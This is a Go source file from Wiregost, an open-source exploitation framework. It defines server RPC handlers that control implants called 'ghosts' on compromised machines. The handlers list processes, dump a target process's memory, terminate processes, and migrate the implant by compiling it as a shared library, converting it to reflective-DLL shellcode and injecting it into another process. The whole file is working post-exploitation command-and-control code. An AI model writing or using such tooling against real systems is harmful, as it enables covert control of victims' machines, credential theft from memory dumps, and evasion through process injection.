// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package rpc

import (
	"time"

	"github.com/golang/protobuf/proto"

	clientpb "github.com/maxlandon/wiregost/protobuf/client"
	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
)

func rpcPs(req []byte, timeout time.Duration, resp Response) {
	psReq := &ghostpb.PsReq{}
	err := proto.Unmarshal(req, psReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := (*core.Wire.Ghosts)[psReq.GhostID]
	if ghost == nil {
		resp([]byte{}, err)
		return
	}

	data, _ := proto.Marshal(&ghostpb.PsReq{})
	data, err = ghost.Request(ghostpb.MsgPsReq, timeout, data)
	resp(data, err)
}

func rpcProcdump(req []byte, timeout time.Duration, resp Response) {
	procdumpReq := &ghostpb.ProcessDumpReq{}
	err := proto.Unmarshal(req, procdumpReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := (*core.Wire.Ghosts)[procdumpReq.GhostID]
	if ghost == nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&ghostpb.ProcessDumpReq{
		Pid: procdumpReq.Pid,
	})

	data, err = ghost.Request(ghostpb.MsgProcessDumpReq, timeout, data)
	resp(data, err)
}

func rpcTerminate(req []byte, timeout time.Duration, resp Response) {
	terminateReq := &ghostpb.TerminateReq{}
	err := proto.Unmarshal(req, terminateReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	ghost := (*core.Wire.Ghosts)[terminateReq.GhostID]
	if ghost == nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&ghostpb.TerminateReq{Pid: terminateReq.GetPid()})
	data, err = ghost.Request(ghostpb.MsgTerminate, timeout, data)
	resp(data, err)
}

func rpcMigrate(req []byte, timeout time.Duration, resp Response) {
	migrateReq := &clientpb.MigrateReq{}
	err := proto.Unmarshal(req, migrateReq)
	if err != nil {
		resp([]byte{}, err)
	}
	ghost := core.Wire.Ghost(migrateReq.GhostID)
	config := generate.GhostConfigFromProtobuf(migrateReq.Config)
	config.Format = clientpb.GhostConfig_SHARED_LIB
	config.ObfuscateSymbols = false
	dllPath, err := generate.GhostSharedLibrary(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&ghostpb.MigrateReq{
		GhostID: migrateReq.GhostID,
		Data:    shellcode,
		Pid:     migrateReq.Pid,
	})
	data, err = ghost.Request(ghostpb.MsgMigrateReq, timeout, data)
	resp(data, err)
}
